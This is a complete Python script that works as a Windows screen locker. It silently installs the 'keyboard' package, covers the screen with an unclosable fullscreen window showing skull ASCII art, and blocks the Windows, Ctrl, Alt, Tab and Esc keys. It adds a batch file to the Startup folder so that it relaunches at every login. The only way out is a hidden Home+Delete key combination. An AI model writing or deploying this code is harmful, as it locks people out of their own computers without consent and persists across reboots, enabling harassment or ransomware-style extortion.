import os
import sys
import tkinter as tk
import subprocess


try:
    import keyboard
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    import keyboard


def add_to_startup():
    startup_dir = os.path.join(
        os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_dir, "FullscreenApp.bat")
    if not os.path.exists(shortcut_path):
        with open(shortcut_path, "w") as f:
            f.write(f'@echo off\npython "{script_path}"\n')


root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", lambda: None)


ascii_art = """

         .e$$$$e.
       e$$$$$$$$$$e
      $$$$$$$$$$$$$$
     d$$$$$$$$$$$$$$b
     $$$$$$$$$$$$$$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F   4$$F   4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
 "*$$$"            ^$$P
    ""              ^"


"""

label = tk.Label(root, text=ascii_art, font=("Courier", 20),
                 fg="green", bg="black", justify="center")
label.place(relx=0.5, rely=0.5, anchor="center")


pressed_keys = set()
def on_key_press(event):
    pressed_keys.add(event.keysym)
    if "Home" in pressed_keys and "Delete" in pressed_keys:
        root.destroy()
def on_key_release(event):
    pressed_keys.discard(event.keysym)
root.bind("<KeyPress>", on_key_press)
root.bind("<KeyRelease>", on_key_release)


keyboard.block_key('left windows')
keyboard.block_key('right windows')
keyboard.block_key('ctrl')
keyboard.block_key('alt')
keyboard.block_key('tab')
keyboard.block_key('esc')


add_to_startup()


root.mainloop()